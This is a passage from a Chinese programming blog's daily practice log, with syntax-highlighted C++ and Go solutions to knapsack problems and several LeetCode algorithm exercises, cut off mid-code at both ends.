class="number">0</span>;i&lt;=V;i++)&#123;</span><br><span class="line">        ans=<span class="built_in">max</span>(ans,f[N][i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 降维</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    每个f[i][j]只和上个f[i-1]的状态相关，没有必要记录全局的f[i][j]</span></span><br><span class="line"><span class="comment">    滚动数组</span></span><br><span class="line"><span class="comment">    为何要逆序循环可以画个表格观察</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">basicOne</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;N,&amp;V);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=N;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;v[i],&amp;w[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=N;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=V;j&gt;=v[i];j--)&#123;</span><br><span class="line">            F[j]=<span class="built_in">max</span>(F[j],F[j-v[i]]+w[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    ans=F[V];</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="built_in">basicOne</span>();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="完全背包问题"><a href="#完全背包问题" class="headerlink" title="完全背包问题"></a>完全背包问题</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="comment">// ACWing 完全背包问题</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    更进了一步，0/1背包每个物品只有选和不选</span></span><br><span class="line"><span class="comment">    完全背包可以放无穷次，在不超过背包限制的情况下</span></span><br><span class="line"><span class="comment">    那么在前i个物品，体积剩余j时，选择放k个物品，最基本的状态转移方程就需要三个for循环</span></span><br><span class="line"><span class="comment">    当然在一定条件下可以降维，慢慢分析</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> n=<span class="number">1010</span>;</span><br><span class="line"><span class="keyword">int</span> N,V;</span><br><span class="line"><span class="keyword">int</span> v[n]; <span class="comment">// volume</span></span><br><span class="line"><span class="keyword">int</span> w[n]; <span class="comment">// weight</span></span><br><span class="line"><span class="keyword">int</span> f[n][n];</span><br><span class="line"><span class="keyword">int</span> F[n];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 基础的三维状态</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    f[i][j][k]</span></span><br><span class="line"><span class="comment">    f[i][j]=max(f[i-1][j-k*v[i]]+w[i]*k)  0&lt;=k&lt;=j/v[i]</span></span><br><span class="line"><span class="comment">    f[i][j]=max(f[i-1][j],f[i-1][j-k*v[i]]+w[i]*k)  1&lt;=k&lt;=j/v[i]</span></span><br><span class="line"><span class="comment">    遗憾的是，这么些会超时，so sad</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">basicThree</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;N,&amp;V);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=N;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;v[i],&amp;w[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=N;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;=V;j++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;=(j/v[i]);k++)&#123;</span><br><span class="line">                f[i][j]=<span class="built_in">max</span>(f[i][j],f[i<span class="number">-1</span>][j-k*v[i]]+k*w[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> ans=f[N][V];</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    优化写法</span></span><br><span class="line"><span class="comment">    f[i][j]-max&#123;f[i-1][j],f[i][j-v[i]]+w[i]&#125;</span></span><br><span class="line"><span class="comment">    推导过程就不写了</span></span><br><span class="line"><span class="comment">    比较一下f[i-1][j-k*v[i]]+k*w[i] 与 f[i][j-v]即可</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">better</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;N,&amp;V);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=N;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;v[i],&amp;w[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=N;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;=V;j++)&#123;</span><br><span class="line">            f[i][j]=f[i<span class="number">-1</span>][j];</span><br><span class="line">            <span class="keyword">if</span>(v[i]&lt;=j)&#123;</span><br><span class="line">                f[i][j]=<span class="built_in">max</span>(f[i][j],f[i][j-v[i]]+w[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> ans=f[N][V];</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    进一步优化就很简单了，和0/1背包的优化方式一样</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">best</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;N,&amp;V);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=N;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;v[i],&amp;w[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=N;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=V;j&gt;=v[i];j--)&#123;</span><br><span class="line">            F[j]=<span class="built_in">max</span>(F[j],F[j-v[i]]+w[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> ans=F[V];</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="built_in">best</span>();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="leetcode-46-全排列-Go"><a href="#leetcode-46-全排列-Go" class="headerlink" title="leetcode 46. 全排列_Go"></a>leetcode 46. 全排列_Go</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 不会回溯法，直接看题解学习</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">permute</span><span class="params">(nums []<span class="keyword">int</span>)</span> [][]<span class="title">int</span></span> &#123;</span><br><span class="line">	ans := [][]<span class="keyword">int</span>&#123;&#125;</span><br><span class="line">	length := <span class="built_in">len</span>(nums)</span><br><span class="line">	<span class="keyword">if</span> length == <span class="number">0</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> ans</span><br><span class="line">	&#125;</span><br><span class="line">	path := []<span class="keyword">int</span>&#123;&#125;</span><br><span class="line">	used := <span class="built_in">make</span>([]<span class="keyword">bool</span>, length)</span><br><span class="line">	dfs(nums, length, path, used, &amp;ans)</span><br><span class="line">	<span class="keyword">return</span> ans</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">dfs</span><span class="params">(nums []<span class="keyword">int</span>, count <span class="keyword">int</span>, path []<span class="keyword">int</span>, used []<span class="keyword">bool</span>, ans *[][]<span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(path) == count &#123;</span><br><span class="line">		*ans = <span class="built_in">append</span>(*ans, path)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; count; i++ &#123;</span><br><span class="line">		<span class="keyword">if</span> used[i] != <span class="literal">false</span> &#123;</span><br><span class="line">			<span class="keyword">continue</span></span><br><span class="line">		&#125;</span><br><span class="line">		used[i] = <span class="literal">true</span></span><br><span class="line">		x := <span class="built_in">append</span>(path, nums[i])</span><br><span class="line">		dfs(nums, count, x, used, ans)</span><br><span class="line">		used[i] = <span class="literal">false</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	nums := []<span class="keyword">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;</span><br><span class="line">	fmt.Println(permute(nums))</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="leetcode-23-合并K个排序链表-Go"><a href="#leetcode-23-合并K个排序链表-Go" class="headerlink" title="leetcode 23. 合并K个排序链表_Go"></a>leetcode 23. 合并K个排序链表_Go</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ListNode : Definition for singly-linked list.</span></span><br><span class="line"><span class="keyword">type</span> ListNode <span class="keyword">struct</span> &#123;</span><br><span class="line">	Val  <span class="keyword">int</span></span><br><span class="line">	Next *ListNode</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 最朴素的想法就是合并k次</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">mergeKLists</span><span class="params">(lists []*ListNode)</span> *<span class="title">ListNode</span></span> &#123;</span><br><span class="line">	k := <span class="built_in">len</span>(lists)</span><br><span class="line">	<span class="keyword">var</span> ans *ListNode</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; k; i++ &#123;</span><br><span class="line">		ans = mergeLists(ans, lists[i])</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> ans</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">mergeLists</span><span class="params">(a *ListNode, b *ListNode)</span> *<span class="title">ListNode</span></span> &#123;</span><br><span class="line">	head := ListNode&#123;&#125;</span><br><span class="line">	tail := &amp;head</span><br><span class="line">	<span class="keyword">if</span> a != <span class="literal">nil</span> &amp;&amp; b == <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> a</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> a == <span class="literal">nil</span> &amp;&amp; b != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> b</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> a != <span class="literal">nil</span> &amp;&amp; b != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">for</span> a != <span class="literal">nil</span> &amp;&amp; b != <span class="literal">nil</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> a.Val &lt; b.Val &#123;</span><br><span class="line">				tail.Next = a</span><br><span class="line">				a = a.Next</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				tail.Next = b</span><br><span class="line">				b = b.Next</span><br><span class="line">			&#125;</span><br><span class="line">			tail = tail.Next</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> a != <span class="literal">nil</span> &#123;</span><br><span class="line">		tail.Next = a</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		tail.Next = b</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> head.Next</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	l1 := &amp;ListNode&#123;&#125;</span><br><span class="line">	l1.Val = <span class="number">1</span></span><br><span class="line">	l1.Next = &amp;ListNode&#123;&#125;</span><br><span class="line">	l1.Next.Val = <span class="number">4</span></span><br><span class="line">	l1.Next.Next = &amp;ListNode&#123;&#125;</span><br><span class="line">	l1.Next.Next.Val = <span class="number">5</span></span><br><span class="line"></span><br><span class="line">	l2 := &amp;ListNode&#123;&#125;</span><br><span class="line">	l2.Val = <span class="number">1</span></span><br><span class="line">	l2.Next = &amp;ListNode&#123;&#125;</span><br><span class="line">	l2.Next.Val = <span class="number">3</span></span><br><span class="line">	l2.Next.Next = &amp;ListNode&#123;&#125;</span><br><span class="line">	l2.Next.Next.Val = <span class="number">4</span></span><br><span class="line"></span><br><span class="line">	l3 := &amp;ListNode&#123;&#125;</span><br><span class="line">	l3.Val = <span class="number">2</span></span><br><span class="line">	l3.Next = &amp;ListNode&#123;&#125;</span><br><span class="line">	l3.Next.Val = <span class="number">6</span></span><br><span class="line"></span><br><span class="line">	list := []*ListNode&#123;l1, l2, l3&#125;</span><br><span class="line">	ans := mergeKLists(list)</span><br><span class="line">	fmt.Println(ans.Val)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>想要优化很容易想到就是直接类似于归并排序来提速</p>
<h3 id="2020-4-27"><a href="#2020-4-27" class="headerlink" title="2020/4/27"></a>2020/4/27</h3><h4 id="leetcode-33-搜索旋转排序数组-Go"><a href="#leetcode-33-搜索旋转排序数组-Go" class="headerlink" title="leetcode 33. 搜索旋转排序数组_Go"></a>leetcode 33. 搜索旋转排序数组_Go</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 时间复杂度怎么讲到o(logn)是个问题</span></span><br><span class="line"><span class="comment">// 想到的就是二分</span></span><br><span class="line"><span class="comment">// 但具体怎么操作还是走一步看一步的</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">search</span><span class="params">(nums []<span class="keyword">int</span>, target <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	n := <span class="built_in">len</span>(nums)</span><br><span class="line">	<span class="keyword">if</span> n == <span class="number">0</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> n == <span class="number">1</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> target == nums[<span class="number">0</span>] &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">	&#125;</span><br><span class="line">	left, right := <span class="number">0</span>, n<span class="number">-1</span></span><br><span class="line">	<span class="keyword">for</span> left &lt;= right &#123;</span><br><span class="line">		mid := left + (right-left)/<span class="number">2</span></span><br><span class="line">		<span class="keyword">if</span> nums[mid] == target &#123;</span><br><span class="line">			<span class="keyword">return</span> mid</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> nums[left] &lt;= nums[mid] &#123;</span><br><span class="line">			<span class="keyword">if</span> nums[left] &lt;= target &amp;&amp; target &lt; nums[mid] &#123;</span><br><span class="line">				right = mid - <span class="number">1</span></span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				left = mid + <span class="number">1</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> nums[mid] &lt; target &amp;&amp; target &lt;= nums[right] &#123;</span><br><span class="line">				left = mid + <span class="number">1</span></span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				right = mid - <span class="number">1</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	nums := []<span class="keyword">int</span>&#123;<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>&#125;</span><br><span class="line">	fmt.Println(search(nums, <span class="number">0</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2020-4-28"><a href="#2020-4-28" class="headerlink" title="2020/4/28"></a>2020/4/28</h3><p>今天主要配置了一下vscode下C++的配置，做点实验</p>
<h4 id="leetcode-1-两数之和-C"><a href="#leetcode-1-两数之和-C" class="headerlink" title="leetcode 1. 两数之和_C++"></a>leetcode 1. 两数之和_C++</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="comment">// brute force</span></span><br><span class="line"></span><br><span class="line"><span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">twoSum</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; ans;</span><br><span class="line">    <span class="keyword">int</span> n=nums.<span class="built_in">size</span>();</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=i+<span class="number">1</span>;j&lt;n;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i]+nums[j]==target)&#123;</span><br><span class="line">                ans.<span class="built_in">push_back</span>(i);</span><br><span class="line">                ans.<span class="built_in">push_back</span>(j);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">4</span>]=&#123;<span class="number">2</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">15</span>&#125;;</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">b</span><span class="params">(a,a+<span class="number">4</span>)</span></span>;</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; ans=<span class="built_in">twoSum</span>(b,<span class="number">9</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d %d\n&quot;</span>,ans[<span class="number">0</span>],ans[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="comment">// 说是说hashTable，我觉得map更方便</span></span><br><span class="line"></span><br><span class="line"><span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">twoSum</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; ans;</span><br><span class="line">    map&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; mp;</span><br><span class="line">    <span class="keyword">int</span> n=nums.<span class="built_in">size</span>();</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> rest=target-nums[i];</span><br><span class="line">        <span class="keyword">if</span>(mp.<span class="built_in">find</span>(rest)!=mp.<span class="built_in">end</span>())&#123;</span><br><span class="line">            map&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;::iterator it=mp.<span class="built_in">find</span>(rest);</span><br><span class="line">            ans.<span class="built_in">push_back</span>(it-&gt;second);</span><br><span class="line">            ans.<span class="built_in">push_back</span>(i);</span><br><span class="line">        &#125;</span><br><span class="line">        mp[nums[i]]=i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">4</span>]=&#123;<span class="number">2</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">15</span>&#125;;</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">b</span><span class="params">(a,a+<span class="number">4</span>)</span></span>;</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; ans=<span class="built_in">twoSum</span>(b,<span class="number">9</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d %d\n&quot;</span>,ans[<span class="number">0</span>],ans[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="leetcode-面试题56-I-数组中数字出现的次数-Go"><a href="#leetcode-面试题56-I-数组中数字出现的次数-Go" class="headerlink" title="leetcode 面试题56 - I. 数组中数字出现的次数_Go"></a>leetcode 面试题56 - I. 数组中数字出现的次数_Go</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 时间复杂度是o(n)还是容易的，空间复杂度要是O(1)，我们就不能hashTable了</span></span><br><span class="line"><span class="comment">// 直接看题解了，做法真的想不到</span></span><br><span class="line"><span class="comment">// 分组异或，位运算</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">singleNumbers</span><span class="params">(nums []<span class="keyword">int</span>)</span> []<span class="title">int</span></span> &#123;</span><br><span class="line">	temp := <span class="number">0</span></span><br><span class="line">	n := <span class="built_in">len</span>(nums)</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; n; i++ &#123;</span><br><span class="line">		temp ^= nums[i]</span><br><span class="line">	&#125;</span><br><span class="line">	a, b := <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">	mask := <span class="number">1</span></span><br><span class="line">	<span class="comment">// find the last 1</span></span><br><span class="line">	<span class="keyword">for</span> mask&amp;temp == <span class="number">0</span> &#123;</span><br><span class="line">		mask &lt;&lt;= <span class="number">1</span></span><br><span class="line">	&#125;</span><br><span class="line">	temp = <span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; n; i++ &#123;</span><br><span class="line">		<span class="keyword">if</span> mask&amp;nums[i] == <span class="number">0</span> &#123;</span><br><span class="line">			a ^= nums[i]</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			b ^= nums[i]</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> []<span class="keyword">int</span>&#123;a, b&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	nums := []<span class="keyword">int</span>&#123;<span class="number">4</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">6</span>&#125;</span><br><span class="line">	fmt.Println(singleNumbers(nums))</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2020-4-29"><a href="#2020-4-29" class="headerlink" title="2020/4/29"></a>2020/4/29</h3><h4 id="leetcode-1095-山脉数组中查找目标值-Go"><a href="#leetcode-1095-山脉数组中查找目标值-Go" class="headerlink" title="leetcode 1095. 山脉数组中查找目标值_Go"></a>leetcode 1095. 山脉数组中查找目标值_Go</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// MountainArray Struct</span></span><br><span class="line"><span class="keyword">type</span> MountainArray <span class="keyword">struct</span> &#123;</span><br><span class="line">	array []<span class="keyword">int</span></span><br><span class="line">	count <span class="keyword">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">create</span><span class="params">(nums []<span class="keyword">int</span>)</span> *<span class="title">MountainArray</span></span> &#123;</span><br><span class="line">	<span class="keyword">return</span> &amp;MountainArray&#123;</span><br><span class="line">		array: nums,</span><br><span class="line">		count: <span class="built_in">len</span>(nums),</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *MountainArray)</span> <span class="title">get</span><span class="params">(index <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> index &gt;= p.count &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> p.array[index]</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *MountainArray)</span> <span class="title">length</span><span class="params">()</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	<span class="keyword">return</span> p.count</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">findInMountainArray</span><span class="params">(target <span class="keyword">int</span>, mountainArr *MountainArray)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> mountainArr.length() == <span class="number">0</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> mountainArr.length() == <span class="number">1</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> mountainArr.get(<span class="number">0</span>) == target &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span></span><br><span 